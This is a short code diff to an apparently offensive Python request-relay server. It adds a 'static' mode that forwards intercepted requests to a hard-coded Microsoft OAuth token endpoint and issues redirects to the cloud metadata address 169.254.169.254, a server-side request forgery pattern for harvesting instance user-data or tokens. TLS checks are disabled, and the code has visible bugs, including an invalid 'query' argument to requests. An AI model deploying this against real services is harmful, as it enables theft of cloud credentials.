@@ -32,6 +32,8 @@ def log_request(msg: str) -> None:
 # Global config vars
 CATCH_ALL_STATUS = 200
 CATCH_ALL_MESSAGE = 'CatchAll'
+STATIC_INTERCEPT_TARGET = 'https://login.microsoftonline.com/1bac0a47-ac0e-4c62-91b9-9780a664b113/oauth2/v2.0/token'
+STATIC_REDIRECT_TARET = 'http://169.254.169.254/latest/user-data/'
 INTERCEPT_PROXIES = {}
 logger = None
 
@@ -112,7 +114,11 @@ def intercept(destination: str):
     urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
     headers = dict(request.headers)
-    target_host = destination.split('/')[2]
+
+    if destination == 'static':
+        target_host = STATIC_INTERCEPT_TARGET
+    else:
+        target_host = destination.split('/')[2]
 
     # Trim out request URI authentication and service port if exists
     at_idx = target_host.find('@')
@@ -121,12 +127,17 @@ def intercept(destination: str):
     end = colon_idx if (colon_idx != -1) else len(target_host)
 
     headers['Host'] = target_host[start:end]
-    body = json.loads(request.body.read().decode('utf-8'))
+    body = None
+    try:
+        body = json.loads(request.body.read().decode('utf-8'))
+    except Exception as err:
+        logger.debug(f'Error parsing intercepted request body: {err}')
+
     method = request.method
 
     logger.info(f'Relaying to {target_host}')
     try:
-        res = requests.request(method, destination, headers=headers, json=body, proxies=INTERCEPT_PROXIES, verify=False)
+        res = requests.request(method, destination, query=request.query_string, headers=headers, json=body, proxies=INTERCEPT_PROXIES, verify=False)
         response.status = res.status_code
         response.headers = res.headers
 
@@ -153,7 +164,9 @@ def response_status(status: int, path: str = None):
     try:
         response.status = status
         if path != None:
-            response.set_header('Location', path)
+            if path == 'static':
+                response.set_header('Location', STATIC_REDIRECT_TARET)
+            else: response.set_header('Location', path)
     except Exception as err:
         logger.warning(f'{err}')
 
